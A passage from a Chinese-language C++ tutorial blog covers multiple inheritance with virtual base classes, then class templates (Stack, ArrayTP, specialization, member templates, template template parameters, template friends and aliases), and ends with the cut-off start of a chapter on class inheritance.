版本的 Talent() 虚函数和歧义: 如果冲突的方法是虚函数，情况会更复杂一些。 如果只有一个基类提供了该虚函数，或者所有提供该虚函数的基类都继承自同一个（可能是虚）基类的同一个虚函数，那么通过派生类对象调用通常没有歧义（动态联编会起作用）。 但是，如果不同的基类提供了签名相同但无关的虚函数，或者派生类想提供一个覆盖所有基类版本的新版本，情况会变得复杂。通常建议在派生类中提供一个新的虚函数，并显式调用所需的基类版本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113// workermi.h, workermi.cpp, worktest.cpp 示例 (模拟 Worker 层次结构)// worker0.h - 基类 Worker#ifndef WORKER0_H_#define WORKER0_H_#include &lt;string&gt;// ... (Worker 定义，包含虚函数 Show() 和 Set()) ...#endif// workermi.h - MI 相关类#ifndef WORKERMI_H_#define WORKERMI_H_#include &quot;worker0.h&quot; // 包含基类#include &lt;iostream&gt;class Waiter : virtual public Worker &#123; // 虚继承private: int panache;protected: void Data() const; void Get();public: Waiter() : Worker(), panache(0) &#123;&#125; Waiter(const std::string &amp; s, long n, int p = 0) : Worker(s, n), panache(p) &#123;&#125; Waiter(const Worker &amp; wk, int p = 0) : Worker(wk), panache(p) &#123;&#125; void Set(); void Show() const; // ...&#125;;class Singer : virtual public Worker &#123; // 虚继承protected: enum &#123;other, alto, contralto, soprano, bass, baritone, tenor&#125;; enum &#123;Vtypes = 7&#125;; void Data() const; void Get();private: static const char *pv[Vtypes]; // string equivs of voice types int voice;public: Singer() : Worker(), voice(other) &#123;&#125; Singer(const std::string &amp; s, long n, int v = other) : Worker(s, n), voice(v) &#123;&#125; Singer(const Worker &amp; wk, int v = other) : Worker(wk), voice(v) &#123;&#125; void Set(); void Show() const; // ...&#125;;// 多重继承class SingingWaiter : public Singer, public Waiter &#123;protected: void Data() const; void Get();public: SingingWaiter() &#123;&#125; // 显式调用虚基类 Worker 的构造函数 SingingWaiter(const std::string &amp; s, long n, int p = 0, int v = other) : Worker(s, n), Waiter(s, n, p), Singer(s, n, v) &#123;&#125; SingingWaiter(const Worker &amp; wk, int p = 0, int v = other) : Worker(wk), Waiter(wk, p), Singer(wk, v) &#123;&#125; SingingWaiter(const Waiter &amp; wt, int v = other) : Worker(wt), Waiter(wt), Singer(wt, v) &#123;&#125; // 从 Waiter 构造 SingingWaiter(const Singer &amp; sg, int p = 0) : Worker(sg), Waiter(sg, p), Singer(sg) &#123;&#125; // 从 Singer 构造 void Set(); void Show() const;&#125;;#endif// workermi.cpp - 实现 (部分)#include &quot;workermi.h&quot;// ... Worker 实现 ...// --- Waiter methods ---void Waiter::Set() &#123; Worker::Get(); // 调用基类方法获取基本信息 Get(); // 调用自己的 Get 获取 panache&#125;void Waiter::Show() const &#123; Worker::Show(); // 调用基类方法显示基本信息 Data(); // 调用自己的 Data 显示 panache&#125;void Waiter::Data() const &#123; /* show panache */ &#125;void Waiter::Get() &#123; /* get panache */ &#125;// --- Singer methods ---// ... (类似实现 Set, Show, Data, Get) ...// --- SingingWaiter methods ---void SingingWaiter::Data() const &#123; Singer::Data(); // 显示 Singer 的数据 Waiter::Data(); // 显示 Waiter 的数据&#125;void SingingWaiter::Get() &#123; Waiter::Get(); // 获取 Waiter 的数据 Singer::Get(); // 获取 Singer 的数据&#125;void SingingWaiter::Set() &#123; Worker::Get(); // 获取 Worker 的数据 (只需要一次，因为是虚基类) Get(); // 调用 SingingWaiter::Get() 获取 Waiter 和 Singer 的数据&#125;void SingingWaiter::Show() const &#123; Worker::Show(); // 显示 Worker 的数据 (只需要一次) Data(); // 调用 SingingWaiter::Data() 显示 Waiter 和 Singer 的数据&#125;// worktest.cpp - 使用示例#include &lt;iostream&gt;#include &quot;workermi.h&quot;// ... (main 函数创建 Worker*, Waiter*, Singer*, SingingWaiter* 数组，并通过基类指针调用 Set 和 Show) ... 14.3.3 MI 小结优点: 可以组合多个不同类的功能。 允许更灵活的类层次结构设计。 缺点: 复杂性增加: 可能导致名称冲突和歧义。 钻石问题: 需要使用虚基类来解决，这会增加构造函数实现的复杂性，并可能引入额外的运行时开销。 难以理解和维护: 复杂的 MI 层次结构可能难以理解和调试。 设计建议: 谨慎使用: 多重继承是一个强大的工具，但也容易被滥用。在决定使用 MI 之前，仔细考虑是否有更简单的替代方案（如包含/组合，或者单继承加接口）。 优先考虑组合: 对于 “has-a” 关系，组合通常是更简单、更安全的选择。 虚基类: 如果确实需要 MI 并且遇到了钻石问题，务必使用虚基类。 明确解决歧义: 使用作用域解析运算符 (::) 来解决成员名称冲突。 许多现代 C++ 实践倾向于避免复杂的多重继承，尤其是在应用层面。然而，在某些库设计（如 IO 流库）或需要混合不同抽象接口的场景中，MI 仍然是一个有用的工具。 14.4 类模板就像函数模板允许我们编写通用的函数，可以处理不同类型的数据一样，类模板 (Class Templates) 允许我们定义通用的类蓝图，可以用来创建处理不同数据类型的类。 类模板是参数化的类定义，其中的某些类型（或值）在定义时是未指定的，而在创建类的实例（对象）时才被指定。这极大地提高了代码的重用性，是泛型编程的核心。STL 中的容器（如 vector, list, map）和智能指针等都是类模板的典型应用。 14.4.1 定义类模板定义类模板的语法与函数模板类似，使用 template 关键字，后跟尖括号 &lt;&gt; 中的模板参数列表。 语法: 123456789101112131415161718192021222324template &lt;typename T1, typename T2, ...&gt; // 或者 template &lt;class T1, class T2, ...&gt;class ClassName &#123; // 类定义，可以使用模板参数 T1, T2 等作为类型private: T1 member1; T2 member2; // ...public: ClassName(const T1 &amp; val1, const T2 &amp; val2); T1 getMember1() const; // ...&#125;;// 成员函数的定义也需要模板前缀template &lt;typename T1, typename T2, ...&gt;ClassName&lt;T1, T2, ...&gt;::ClassName(const T1 &amp; val1, const T2 &amp; val2) : member1(val1), member2(val2) &#123; // ...&#125;template &lt;typename T1, typename T2, ...&gt;T1 ClassName&lt;T1, T2, ...&gt;::getMember1() const &#123; return member1;&#125; template &lt;typename T&gt; 或 template &lt;class T&gt;: 声明一个模板，T 是一个类型参数的占位符。typename 和 class 在这里是等价的。你可以使用任何有效的标识符作为类型参数名（通常用 T, U, V 等）。 在类定义内部，可以使用模板参数 T 就像使用普通类型一样（例如，定义成员变量类型、函数参数类型、返回值类型）。 成员函数定义: 当在类外部定义模板类的成员函数时，必须再次使用 template &lt;...&gt; 前缀，并且在类名后面跟上模板参数列表 &lt;T1, T2, ...&gt;。 示例：简单的 Stack 模板类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// stacktp.h -- 一个简单的栈模板类定义#ifndef STACKTP_H_#define STACKTP_H_template &lt;typename T&gt; // 或者 template &lt;class T&gt;class Stack &#123;private: enum &#123; MAX = 10 &#125;; // 栈的最大容量 (非类型参数可以改进) T items[MAX]; // 存储栈元素的数组，类型为 T int top; // 栈顶索引public: Stack(); bool isempty() const; bool isfull() const; // push() returns false if stack already is full, true otherwise bool push(const T &amp; item); // 参数类型为 T // pop() returns false if stack already is empty, true otherwise bool pop(T &amp; item); // 参数类型为 T (通过引用返回弹出的元素)&#125;;// 成员函数实现 (通常也放在头文件中)template &lt;typename T&gt;Stack&lt;T&gt;::Stack() : top(0) &#123; // 初始化栈顶&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::isempty() const &#123; return top == 0;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::isfull() const &#123; return top == MAX;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::push(const T &amp; item) &#123; if (top &lt; MAX) &#123; items[top++] = item; // 使用类型 T 的赋值操作 return true; &#125; else &#123; return false; &#125;&#125;template &lt;typename T&gt;bool Stack&lt;T&gt;::pop(T &amp; item) &#123; if (top &gt; 0) &#123; item = items[--top]; // 使用类型 T 的赋值操作 return true; &#125; else &#123; return false; &#125;&#125;#endif // STACKTP_H_ 14.4.2 使用模板类要使用类模板，你需要实例化 (Instantiate) 它。实例化是指为模板参数提供具体的类型（或值），从而创建一个具体的类。 语法: 1ClassName&lt;ConcreteType1, ConcreteType2, ...&gt; objectName(constructor_arguments); 在类模板名称后面跟上尖括号 &lt;&gt;，并在其中指定用于替换模板参数的具体类型。 然后像创建普通类的对象一样声明对象并调用构造函数。 示例：使用 Stack 模板 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// stack_user.cpp -- 使用 Stack 模板类#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;cctype&gt; // for isalpha, etc. (假设用于处理输入)#include &quot;stacktp.h&quot; // 包含模板定义int main() &#123; // 实例化一个处理 int 的栈 Stack&lt;int&gt; intStack; // intStack 是一个 Stack&lt;int&gt; 类型的对象 int i = 0; std::cout &lt;&lt; &quot;Pushing integers onto intStack:\\n&quot;; while (!intStack.isfull() &amp;&amp; i &lt; 5) &#123; intStack.push(i++); std::cout &lt;&lt; i-1 &lt;&lt; &quot; pushed. &quot;; &#125; std::cout &lt;&lt; std::endl; int tempInt; std::cout &lt;&lt; &quot;Popping integers from intStack:\\n&quot;; while (intStack.pop(tempInt)) &#123; std::cout &lt;&lt; tempInt &lt;&lt; &quot; popped. &quot;; &#125; std::cout &lt;&lt; std::endl; // 实例化一个处理 string 的栈 Stack&lt;std::string&gt; stringStack; // stringStack 是一个 Stack&lt;std::string&gt; 对象 std::string items[] = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;; std::cout &lt;&lt; &quot;Pushing strings onto stringStack:\\n&quot;; for (const auto&amp; s : items) &#123; if (stringStack.push(s)) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; s &lt;&lt; &quot;\\&quot; pushed. &quot;; &#125; else &#123; std::cout &lt;&lt; &quot;Stack full, cannot push \\&quot;&quot; &lt;&lt; s &lt;&lt; &quot;\\&quot;.\\n&quot;; break; &#125; &#125; std::cout &lt;&lt; std::endl; std::string tempString; std::cout &lt;&lt; &quot;Popping strings from stringStack:\\n&quot;; while (stringStack.pop(tempString)) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; tempString &lt;&lt; &quot;\\&quot; popped. &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 编译和运行: 由于模板的实现通常放在头文件中，你只需要编译使用模板的源文件。 12g++ stack_user.cpp -o stack_user./stack_user 输出: 12345678Pushing integers onto intStack:0 pushed. 1 pushed. 2 pushed. 3 pushed. 4 pushed.Popping integers from intStack:4 popped. 3 popped. 2 popped. 1 popped. 0 popped.Pushing strings onto stringStack:&quot;apple&quot; pushed. &quot;banana&quot; pushed. &quot;cherry&quot; pushed.Popping strings from stringStack:&quot;cherry&quot; popped. &quot;banana&quot; popped. &quot;apple&quot; popped. 14.4.3 深入探讨模板类 模板编译模型: 类模板本身并不会被编译成代码。只有当你用具体类型实例化模板时，编译器才会根据提供的类型生成对应的具体类（例如 Stack&lt;int&gt; 类和 Stack&lt;string&gt; 类）的代码。这个过程称为**模板实例化 (Template Instantiation)**。 实现放在头文件: 由于编译器在实例化模板时需要看到模板的完整定义（包括成员函数的实现），所以类模板的成员函数实现通常也放在头文件中 (.h 或 .hpp)，而不是单独的 .cpp 文件中。如果放在 .cpp 文件中，链接器在链接其他使用该模板的 .cpp 文件时，可能找不到所需实例化的代码。 隐式实例化 (Implicit Instantiation): 当你声明一个特定类型的模板类对象时（如 Stack&lt;int&gt; s;），编译器会自动进行隐式实例化。 显式实例化 (Explicit Instantiation): 你可以显式地指示编译器创建一个特定类型的实例，即使代码中没有直接使用该类型的对象。这在某些库设计或构建过程中可能有用。 1template class Stack&lt;double&gt;; // 在某个 .cpp 文件中显式实例化 Stack&lt;double&gt; 类型要求: 模板代码对用作模板参数的类型通常有一些隐式要求。例如，Stack 模板要求类型 T 具有可用的赋值运算符 (operator=)，因为 push 和 pop 方法中使用了赋值。如果尝试用不满足这些要求的类型（如没有赋值运算符的类）实例化模板，编译器会报错。 14.4.4 数组模板示例和非类型参数类模板不仅可以有类型参数 (typename T 或 class T)，还可以有**非类型参数 (Non-type Parameters)**。非类型参数是具有固定类型的值，通常是整型（int, size_t 等）、指针、引用或枚举。 语法: 123456789template &lt;typename T, int N&gt; // T 是类型参数，N 是非类型参数 (int 类型)class ArrayTP &#123;private: T ar[N]; // 数组大小由模板参数 N 决定 // ...public: T &amp; operator[](int i); // ...&#125;; 非类型参数 N 成为模板定义的一部分。 在实例化时，必须为非类型参数提供一个常量表达式。 示例：固定大小的数组模板 ArrayTP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// arraytp.h -- 模板类 ArrayTP#ifndef ARRAYTP_H_#define ARRAYTP_H_#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for exit()template &lt;typename T, int n&gt; // n 是非类型参数class ArrayTP &#123;private: T ar[n]; // 数组大小为 npublic: ArrayTP() &#123;&#125;; explicit ArrayTP(const T &amp; v); virtual T &amp; operator[](int i); virtual T operator[](int i) const;&#125;;template &lt;typename T, int n&gt;ArrayTP&lt;T, n&gt;::ArrayTP(const T &amp; v) &#123; for (int i = 0; i &lt; n; i++) ar[i] = v;&#125;template &lt;typename T, int n&gt;T &amp; ArrayTP&lt;T, n&gt;::operator[](int i) &#123; if (i &lt; 0 || i &gt;= n) &#123; std::cerr &lt;&lt; &quot;Error in array limits: &quot; &lt;&lt; i &lt;&lt; &quot; is out of range\\n&quot;; std::exit(EXIT_FAILURE); &#125; return ar[i];&#125;template &lt;typename T, int n&gt;T ArrayTP&lt;T, n&gt;::operator[](int i) const &#123; if (i &lt; 0 || i &gt;= n) &#123; std::cerr &lt;&lt; &quot;Error in array limits: &quot; &lt;&lt; i &lt;&lt; &quot; is out of range\\n&quot;; std::exit(EXIT_FAILURE); &#125; return ar[i];&#125;#endif // ARRAYTP_H_// 使用 ArrayTP#include &quot;arraytp.h&quot; // 包含模板定义int main() &#123; // 实例化一个包含 10 个 int 的数组 ArrayTP&lt;int, 10&gt; sums; // 实例化一个包含 10 个 double 的数组 ArrayTP&lt;double, 10&gt; aves; // 实例化一个包含 5 个指向 double 的指针的数组 ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt; twodee; // 模板嵌套：10x5 的 int 数组 int i, j; for (i = 0; i &lt; 10; i++) &#123; sums[i] = 0; for (j = 0; j &lt; 5; j++) &#123; twodee[i][j] = (i + 1) * (j + 1); sums[i] += twodee[i][j]; &#125; aves[i] = (double) sums[i] / 5; &#125; for (i = 0; i &lt; 10; i++) &#123; std::cout.width(2); std::cout &lt;&lt; i &lt;&lt; &quot;: &quot;; std::cout.width(3); std::cout &lt;&lt; sums[i] &lt;&lt; &quot; = average &quot; &lt;&lt; aves[i] &lt;&lt; std::endl; &#125; // ArrayTP&lt;double, 0&gt; zero_size; // 错误或无意义，取决于编译器和实现 return 0;&#125; ArrayTP&lt;int, 10&gt; 和 ArrayTP&lt;double, 10&gt; 是不同的类型。 ArrayTP&lt;int, 10&gt; 和 ArrayTP&lt;int, 12&gt; 也是不同的类型。 非类型参数允许我们在编译时确定数组大小等属性，这比动态分配更高效，并且可以进行更严格的类型检查。std::array 就是使用非类型参数来指定大小的。 14.4.5 模板多功能性类模板可以与 C++ 的其他特性结合使用，提供强大的功能： 递归使用: 模板可以递归地使用自身，如 ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt; 创建二维数组。 指针类型参数: 可以用指针类型实例化模板，例如 Stack&lt;int*&gt; 创建一个存储 int 指针的栈。 包含模板成员: 类模板可以包含其他模板类的对象作为成员。 继承: 类模板可以参与继承，可以从模板类派生，也可以从普通类派生，或者模板类本身从其他类派生。 14.4.6 模板的具体化有时，通用的模板定义对于某些特定类型可能不是最优的，或者根本无法工作。这时，我们需要为特定类型提供一个专门化的模板定义，这称为**模板具体化 (Template Specialization)**。 显式具体化 (Explicit Specialization): 为某个特定的类型（或一组特定类型）提供一个完全不同的类定义。 语法: 1234template &lt;&gt; // 空的模板参数列表class ClassName&lt;SpecificType&gt; &#123; // 针对 SpecificType 的特殊实现&#125;; 示例: 假设我们想为 Stack&lt;const char*&gt; 提供一个特殊版本，它能正确处理 C 风格字符串的复制。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;cstring&gt; // for strcpy, strlen// 显式具体化 Stack&lt;const char*&gt;template &lt;&gt;class Stack&lt;const char *&gt; &#123;private: enum &#123; MAX = 5 &#125;; // 假设容量不同 char * items[MAX]; // 存储指向动态分配字符串的指针 int top;public: Stack(); ~Stack(); // 需要析构函数释放内存 // ... isempty, isfull ... bool push(const char * const &amp; item); // 注意参数类型 bool pop(const char * &amp; item); // 注意参数类型 // 需要禁用或实现复制构造和赋值 Stack(const Stack &amp;) = delete; Stack &amp; operator=(const Stack &amp;) = delete;&#125;;// 实现 (部分)Stack&lt;const char *&gt;::Stack() : top(0) &#123; for(int i=0; i&lt;MAX; ++i) items[i] = nullptr;&#125;Stack&lt;const char *&gt;::~Stack() &#123; for (int i = 0; i &lt; top; ++i) &#123; delete [] items[i]; // 释放 push 时分配的内存 &#125;&#125;bool Stack&lt;const char *&gt;::push(const char * const &amp; item) &#123; if (top &lt; MAX) &#123; items[top] = new char[std::strlen(item) + 1]; // 分配新内存 std::strcpy(items[top], item); // 复制字符串内容 top++; return true; &#125; else &#123; return false; &#125;&#125;bool Stack&lt;const char *&gt;::pop(const char * &amp; item) &#123; if (top &gt; 0) &#123; top--; item = items[top]; // 返回指针 (注意：调用者不应 delete 这个指针) // 或者更好的做法是复制一份返回 // delete [] items[top]; // 如果 pop 后不再需要，则删除 // items[top] = nullptr; return true; &#125; else &#123; return false; &#125;&#125;// ... 其他实现 ... 当编译器遇到 Stack&lt;const char *&gt; 时，它会使用这个显式具体化版本，而不是通用的 Stack&lt;T&gt; 模板。 部分具体化 (Partial Specialization): 只限制模板参数的一部分，而不是全部。例如，为所有指针类型提供一个特殊版本，或者为一个有两个类型参数的模板固定其中一个参数。 语法 (示例): 1234567891011// 原始模板template &lt;typename T1, typename T2&gt; class Pair &#123; /* ... */ &#125;;// 部分具体化：T2 固定为 inttemplate &lt;typename T1&gt; class Pair&lt;T1, int&gt; &#123; /* ... 特殊实现 ... */ &#125;;// 部分具体化：T1 和 T2 都是指针类型template &lt;typename T1, typename T2&gt; class Pair&lt;T1*, T2*&gt; &#123; /* ... 特殊实现 ... */ &#125;;// 部分具体化：T1 和 T2 是相同类型template &lt;typename T&gt; class Pair&lt;T, T&gt; &#123; /* ... 特殊实现 ... */ &#125;; 编译器会选择最匹配的具体化版本。如果多个部分具体化都能匹配，或者一个部分具体化和一个显式具体化都能匹配，编译器会选择“更具体”的那个。 14.4.7 成员模板类（无论是普通类还是模板类）可以包含本身是模板的成员函数或成员类。这称为**成员模板 (Member Templates)**。 示例：模板构造函数和模板赋值运算符 智能指针类（如 unique_ptr, shared_ptr）经常使用模板构造函数和模板赋值运算符，以允许从指向派生类的智能指针构造或赋值给指向基类的智能指针。 12345678910111213141516171819202122232425262728293031323334template&lt;typename T&gt;class SmartPtr &#123;private: T* ptr;public: explicit SmartPtr(T* p = nullptr) : ptr(p) &#123;&#125; ~SmartPtr() &#123; delete ptr; &#125; // 模板成员：模板复制构造函数 template&lt;typename U&gt; SmartPtr(const SmartPtr&lt;U&gt;&amp; other) &#123; // 允许从 SmartPtr&lt;U&gt; 构造 SmartPtr&lt;T&gt; // 通常需要 U* 能够隐式转换为 T* (例如 U 是 T 的派生类) ptr = other.get(); // 简化示例，实际智能指针复制更复杂 // ... 可能需要增加引用计数等 ... &#125; // 模板成员：模板赋值运算符 template&lt;typename U&gt; SmartPtr&amp; operator=(const SmartPtr&lt;U&gt;&amp; other) &#123; // ... 类似逻辑 ... return *this; &#125; T* get() const &#123; return ptr; &#125; // ... 其他成员 ...&#125;;// 使用class Base &#123;&#125;;class Derived : public Base &#123;&#125;;SmartPtr&lt;Derived&gt; pDerived(new Derived);SmartPtr&lt;Base&gt; pBase = pDerived; // OK: 调用模板复制构造函数 SmartPtr&lt;Base&gt;(const SmartPtr&lt;Derived&gt;&amp;) 成员模板增加了类的灵活性，允许成员函数或嵌套类处理更广泛的类型。 14.4.8 将模板用作参数模板本身也可以作为模板的参数，这称为**模板模板参数 (Template Template Parameters)**。 语法: 123456template &lt;typename T, template &lt;typename U&gt; class Container&gt; // Container 是一个模板模板参数class Manager &#123;private: Container&lt;T&gt; items; // 使用模板参数 Container 来实例化 // ...&#125;; template &lt;typename U&gt; class Container: 声明 Container 是一个接受一个类型参数的类模板。 在 Manager 内部，可以用具体的类型 T 来实例化 Container，如 Container&lt;T&gt;。 示例: 创建一个可以使用不同容器（如 std::vector, std::list, 或我们自己的 Stack）来存储元素的 Manager。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;list&gt;#include &quot;stacktp.h&quot; // 假设 Stack&lt;T&gt; 在这里template &lt;typename T, template &lt;typename Elem&gt; class Container&gt; // Container 接受一个类型参数 Elemclass Manager &#123;private: Container&lt;T&gt; items; // 使用 Container&lt;T&gt; 来存储 T 类型的元素public: void add(const T&amp; item) &#123; // 假设 Container 有 push_back 或 push 方法 // items.push_back(item); // 如果是 vector/list // items.push(item); // 如果是 Stack // 需要更通用的方式或对 Container 有要求 &#125; // ...&#125;;int main() &#123; // 使用 std::vector 作为容器 Manager&lt;int, std::vector&gt; vectorManager; // vectorManager.add(10); // 使用 std::list 作为容器 Manager&lt;double, std::list&gt; listManager; // listManager.add(3.14); // 使用我们自己的 Stack 作为容器 Manager&lt;std::string, Stack&gt; stackManager; // stackManager.add(&quot;hello&quot;); return 0;&#125; 模板模板参数使得代码更加通用，可以适配不同的模板结构。 14.4.9 模板类和友元友元关系可以与类模板结合，有几种不同的形式： 非模板友元函数/类: 一个普通的（非模板）函数或类可以是模板类的友元。这意味着这个函数/类可以访问所有该模板类实例化的私有成员。 123456789101112131415template &lt;typename T&gt;class HasFriend &#123; friend void report(const HasFriend&lt;T&gt; &amp;); // 非模板函数 report 是所有实例的友元private: T item;public: HasFriend(const T &amp; i) : item(i) &#123;&#125;&#125;;// report 函数需要为每个实例单独定义或使用模板// void report(const HasFriend&lt;int&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // 针对 int 实例// void report(const HasFriend&lt;double&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // 针对 double 实例// 或者将 report 也定义为模板函数template &lt;typename T&gt;void report(const HasFriend&lt;T&gt; &amp; hf) &#123; std::cout &lt;&lt; hf.item; &#125; // 模板友元函数 约束模板友元函数/类 (Bound Template Friend): 模板函数/类的特定实例化是模板类的特定实例化的友元。即 Friend&lt;T&gt; 是 Target&lt;T&gt; 的友元。 12345678910111213141516// 前向声明template &lt;typename T&gt; class Target;template &lt;typename T&gt; void friend_func(const Target&lt;T&gt; &amp;);template &lt;typename T&gt;class Target &#123; // friend_func&lt;T&gt; 是 Target&lt;T&gt; 的友元 friend void friend_func&lt;T&gt;(const Target&lt;T&gt; &amp;);private: T data;&#125;;template &lt;typename T&gt;void friend_func(const Target&lt;T&gt; &amp; t) &#123; std::cout &lt;&lt; t.data; // 可以访问 Target&lt;T&gt; 的私有成员&#125; 这里，friend_func&lt;int&gt; 是 Target&lt;int&gt; 的友元，friend_func&lt;double&gt; 是 Target&lt;double&gt; 的友元，但 friend_func&lt;int&gt; 不是 Target&lt;double&gt; 的友元。 非约束模板友元函数/类 (Unbound Template Friend): 模板函数/类的所有实例化都是模板类的所有实例化的友元。即任何 Friend&lt;U&gt; 都是任何 Target&lt;T&gt; 的友元。 1234567891011121314151617181920template &lt;typename T&gt;class AnotherTarget &#123; // 声明模板函数 show_data 为友元 template &lt;typename U&gt; // 模板参数 U 可以与 T 不同 friend void show_data(const AnotherTarget&lt;U&gt; &amp;);private: T data;&#125;;template &lt;typename U&gt;void show_data(const AnotherTarget&lt;U&gt; &amp; at) &#123; std::cout &lt;&lt; at.data; // 可以访问任何 AnotherTarget&lt;U&gt; 实例的私有成员&#125;// 使用AnotherTarget&lt;int&gt; ati(10);AnotherTarget&lt;double&gt; atd(3.14);// show_data&lt;int&gt;(ati); // OK// show_data&lt;double&gt;(atd); // OK// show_data&lt;int&gt;(atd); // 也能访问 atd.data，因为 show_data&lt;int&gt; 是所有 AnotherTarget 的友元 非约束友元提供了最大的访问权限，但也可能破坏封装，需要谨慎使用。 14.4.10 模板别名（C++11）C++11 引入了 using 关键字（之前主要用于 using 声明和 using 指令）来创建**模板别名 (Template Aliases)**，使得使用复杂的模板类型更加方便。 语法: 123456// 为特定实例化创建别名using AliasName = ExistingTemplate&lt;ConcreteType&gt;;// 为模板本身创建别名 (参数化的别名)template &lt;typename T&gt;using AliasTemplateName = ExistingTemplate&lt;T, SomeFixedType, ...&gt;; 示例: 123456789101112131415161718192021222324252627282930#include &lt;vector&gt;#include &lt;string&gt;#include &lt;array&gt;// 为特定实例化创建别名using IntVec = std::vector&lt;int&gt;;using StringArray10 = std::array&lt;std::string, 10&gt;;// 为模板创建别名template&lt;typename T&gt;using Vec = std::vector&lt;T&gt;; // Vec&lt;T&gt; 等价于 std::vector&lt;T&gt;template&lt;typename T&gt;using Array12 = std::array&lt;T, 12&gt;; // Array12&lt;T&gt; 等价于 std::array&lt;T, 12&gt;int main() &#123; IntVec numbers; // numbers 是 std::vector&lt;int&gt; numbers.push_back(1); StringArray10 names; // names 是 std::array&lt;std::string, 10&gt; names[0] = &quot;Alice&quot;; Vec&lt;double&gt; doubles; // doubles 是 std::vector&lt;double&gt; doubles.push_back(3.14); Array12&lt;char&gt; chars; // chars 是 std::array&lt;char, 12&gt; chars[0] = &#x27;a&#x27;; return 0;&#125; 模板别名比传统的 typedef 更强大，因为 typedef 不能直接为模板创建别名（只能为完全实例化的类型创建别名）。模板别名提高了代码的可读性和易用性。 14.5 总结本章探讨了 C++ 中除了公有继承之外的其他代码重用技术，包括包含（组合）、私有继承、保护继承、多重继承以及强大的类模板。这些技术提供了不同的方式来建立类之间的关系和创建可重用的通用代码。 主要内容回顾： 包含/组合 (Composition): 通过将一个类的对象作为另一个类的成员来实现，模拟 “has-a” 关系。 是代码重用的常用且推荐的方式，特别是当成员对象能自我管理资源时（遵循零法则）。 包含类的构造函数使用成员初始化列表来初始化成员对象。 例如，Student 类包含 std::string 和 std::valarray&lt;double&gt; 成员。 私有继承 (private): 模拟 “is-implemented-in-terms-of” 关系，继承实现但不继承接口。 基类的公有和保护成员在派生类中变为私有。 通常不如包含直观和灵活，但可用于访问基类的保护成员或覆盖虚函数（虽然访问权限变为私有）。 派生类需要提供自己的接口来暴露所需功能，内部访问基类成员通常需要类型转换。 保护继承 (protected): 基类的公有和保护成员在派生类中变为保护。 与私有继承类似，继承实现但不继承接口。 允许后续的派生类访问继承来的（现在是保护的）成员。 使用场景非常有限。 包含 vs. 私有继承: 对于 “has-a” 关系，**优先选择包含 (组合)**，因为它更简单、清晰、灵活。 using 声明与继承: 在私有或保护继承下，可以使用 using Base::member; 在派生类中恢复基类某个成员的可访问性（通常提升到 public 或 protected）。 多重继承 (MI): 允许一个类从多个基类继承。 可能导致歧义（成员名冲突）和钻石问题（共同基类的多副本）。 名称冲突通过作用域解析运算符 (::) 解决。 钻石问题通过虚基类 (virtual public Base) 解决，确保共享基类的单一副本，但构造函数实现更复杂。 应谨慎使用，优先考虑组合或单继承。 类模板: 允许创建参数化的类蓝图，用于生成处理不同类型的类。 使用 template &lt;typename T, ...&gt; 定义。 通过提供具体类型来实例化模板类，如 Stack&lt;int&gt;。 模板实现通常放在头文件中。 可以有非类型参数（如 template &lt;typename T, int N&gt;），用于在编译时确定常量值（如数组大小）。 模板具体化（显式和部分）允许为特定类型提供专门的实现。 类可以包含成员模板（模板化的成员函数或嵌套类）。 模板可以作为其他模板的参数（模板模板参数）。 模板可以与友元结合，有约束和非约束两种形式。 C++11 引入了**模板别名 (using Alias = ...)**，简化复杂模板类型的使用。 本章介绍的技术极大地扩展了 C++ 代码重用的可能性，从简单的对象组合到复杂的继承层次结构和强大的泛型编程工具——类模板。理解这些技术及其适用场景对于设计灵活、可维护和可重用的 C++ 代码至关重要。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 13 类继承","slug":"Cpp_tutorial_Chapter_13","date":"2025-04-30T15:42:24.009Z","updated":"2025-04-30T15:40:12.230Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_13/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_13/","excerpt":"","text":"13.1 一个简单的基类面向对象编程 (OOP) 的一个核心优势是代码重用。除了通过包含对象成员（组合）之外，C++ 还提供了另一种强大的代码重用机制：**继承 (Inheritance)**。 继承允许我们基于一个已有的类（称为基类 (Base Class) 或父类 (Parent Class)**）来创建一个新的类（称为派生类 (Derived Class)** 或**子类 (Child Class)**）。派生类会自动获得基类的所有成员（数据和函数），并且可以添加自己的新成员或修改继承来的成员的行为。 这种机制非常适合用来表示现实世界中的“is-a”（是一种）关系。例如，一个“经理”是一个“员工”，一个“圆”是一个“形状”。 本节我们将从定义一个简单的基类开始，然后演示如何从中派生出新的类。 场景: 假设我们要为一个乒乓球俱乐部编写程序，需要表示球员信息。 基类 TableTennisPlayer: 我们首先创建一个基础的 TableTennisPlayer 类，包含球员的姓名和是否有球桌。 tabtenn0.h (基类定义) 123456789101112131415161718192021#ifndef TABTENN0_H_#define TABTENN0_H_#include &lt;string&gt;// 简单的基类class TableTennisPlayer &#123;private: std::string firstname; std::string lastname; bool hasTable;public: // 构造函数 TableTennisPlayer (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // 方法 void Name() 